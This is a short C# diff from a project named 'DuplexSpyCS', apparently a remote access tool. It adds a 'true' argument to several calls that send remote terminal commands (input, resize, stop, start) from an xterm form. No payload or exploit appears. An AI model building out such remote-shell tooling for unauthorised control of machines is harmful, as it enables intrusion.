@@ -63,7 +63,7 @@ namespace DuplexSpyCS
                         "xterm",
                         "input",
                         b64,
-                    });
+                    }, true);
                 }
             };
 
@@ -82,7 +82,7 @@ namespace DuplexSpyCS
                         "resize",
                         cols.ToString(),
                         rows.ToString(),
-                    });
+                    }, true);
                 }
             };
 
@@ -108,7 +108,7 @@ namespace DuplexSpyCS
             {
                 "xterm",
                 "stop",
-            });
+            }, true);
         }
 
         private void frmXterm_SizeChanged(object sender, EventArgs e)
@@ -137,7 +137,7 @@ namespace DuplexSpyCS
                 "start",
                 @textBox1.Text,
                 m_szInitDir,
-            });
+            }, true);
         }
     }
 }
